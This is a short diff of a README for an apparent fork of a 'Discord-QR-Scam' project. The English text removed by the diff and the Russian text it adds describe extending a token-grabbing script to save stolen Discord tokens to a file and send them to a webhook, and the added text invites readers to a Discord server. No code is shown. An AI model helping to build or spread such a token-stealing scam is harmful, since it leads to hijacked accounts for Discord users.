@@ -1,5 +1,6 @@
 # Discord-QR-Scam
 
-See [original README.md](https://github.com/NightfallGT/Discord-QR-Scam) for info.
+Читайте новый [original README.md](https://github.com/NightfallGT/Discord-QR-Scam) для подробной инфы.
 
-Simply extended the script by a few lines to dump the grabbed token into a text file AND to send it to a webhook.
+Я форкнул репо где добавили вебхук + переделал темплейт и сам код от нефиг делать
+Я - не автор, этот репо - форк, но если хочещь - то вот мой дискорд сервер: https://discord.gg/eYUxhx5N8t
